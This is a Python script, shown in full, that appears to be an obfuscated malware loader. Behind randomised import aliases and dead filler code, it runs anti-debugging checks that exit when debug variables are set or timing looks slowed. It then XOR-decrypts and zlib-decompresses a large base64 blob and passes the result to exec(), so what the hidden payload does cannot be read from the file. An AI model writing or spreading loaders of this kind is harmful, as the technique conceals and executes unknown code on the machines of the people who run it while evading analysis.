
import base64 as CryXPrjc, zlib as LIGUxYzs, marshal as wvYHcStO, hashlib as __h, os as FZGsrind, sys as pVZsBHsK, time as kCksabHg

WdpmviQR = 8604
LeAlVdwH = 'VIEjEji6APMv'
FLHDdCZG = lambda x: x

def eilPfiGE():
    x = 0
    for i in range(5):
        x += i
    return x


HLLFHJCM = [134, 161, 180, 183, 185, 176, 158, 186, 177, 188, 231, 228, 134, 180, 185, 161, 134, 161, 167, 188, 187, 178, 177, 146, 229, 166]
UaDlDCob = 213
CiOqAKmg = ''.join(chr(b ^ UaDlDCob) for b in HLLFHJCM)
VvfDlBbE = __h.sha256(CiOqAKmg.encode()).digest()

def IgMeNwCe():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if FZGsrind.environ.get(v):
            pVZsBHsK.exit(1)
    t1 = kCksabHg.time()
    kCksabHg.sleep(0.1)
    t2 = kCksabHg.time()
    if t2 - t1 > 0.5:
        pVZsBHsK.exit(1)

IgMeNwCe()

WClCseQa_data = ["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"]
WClCseQa_key = ["8xEAAABjggaqxonzKOnCq1lUsTpYpg=="]

WClCseQa_data_joined = ''.join(WClCseQa_data)
WClCseQa_key_joined = ''.join(WClCseQa_key)

WBqtuAQR = CryXPrjc.b64decode(WClCseQa_key_joined)
YFLxUzmK = wvYHcStO.loads(WBqtuAQR)
qRlFejPI = bytes([b ^ VvfDlBbE[i % len(VvfDlBbE)] for i, b in enumerate(YFLxUzmK)]).decode()

WClCseQa_enc = CryXPrjc.b64decode(WClCseQa_data_joined)
ixDRxAwP = bytes([b ^ ord(qRlFejPI[i % len(qRlFejPI)]) for i, b in enumerate(WClCseQa_enc)])
tKNWMSSJ = LIGUxYzs.decompress(ixDRxAwP)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(tKNWMSSJ)
